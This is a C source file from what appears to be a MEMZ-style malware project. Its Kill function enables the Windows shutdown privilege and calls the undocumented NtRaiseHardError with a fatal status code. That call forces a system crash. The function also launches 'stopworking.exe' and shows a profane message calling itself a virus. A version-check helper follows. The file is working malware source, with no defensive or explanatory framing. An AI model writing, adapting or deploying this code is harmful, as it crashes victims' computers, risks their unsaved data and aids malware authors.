#include "360MEMZ.h"

BOOL WINAPI SetPrivilege(LPCWSTR lpPrivilegeName, WINBOOL fEnable){
	HANDLE hToken; 
	TOKEN_PRIVILEGES NewState; 
	LUID luidPrivilegeLUID; 
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	
	if(!fEnable)
	{
		if(!AdjustTokenPrivileges(hToken, TRUE, NULL, 0, NULL, NULL)) return FALSE;
		else return TRUE;
	}
	LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeLUID);
	
	NewState.PrivilegeCount = 1; 
	NewState.Privileges[0].Luid = luidPrivilegeLUID; 
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	
	if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, 0, NULL, NULL)) return FALSE;
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
	return TRUE;
}

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCH   Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef LONG (WINAPI *type_NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response);
typedef LONG (WINAPI *type_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR); 

void Kill(){
	system("stopworking.exe");
	UNICODE_STRING str;
    HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
    type_NtRaiseHardError NtRaiseHardError = (type_NtRaiseHardError)GetProcAddress(hDll, "NtRaiseHardError");
 	type_RtlInitUnicodeString RtlInitUnicodeString = (type_RtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");
 	
 	RtlInitUnicodeString(&str, L"virus by gt428 fucked your computer so the"); 
 	ULONG x; 
 	BOOL bSuccess = SetPrivilege(SE_SHUTDOWN_NAME, TRUE);
 	ULONG n[4] = {(ULONG)&str, 0xDEADDEAD, 0, 0};
    if(bSuccess) NtRaiseHardError(0xC000021A, 4, 1, n, OptionShutdownSystem, &x);
    
    SetPrivilege(NULL, FALSE);
}


BOOL IsWin7OrLater()
{
    // Initialize the OSVERSIONINFOEX structure.
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osvi.dwMajorVersion = 6;
    osvi.dwMinorVersion = 1;

    // Initialize the condition mask.
    DWORDLONG dwlConditionMask = 0;
    VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);

    // Perform the test.
    return VerifyVersionInfo(&osvi, 
                             VER_MAJORVERSION | VER_MINORVERSION,
                             dwlConditionMask);
}
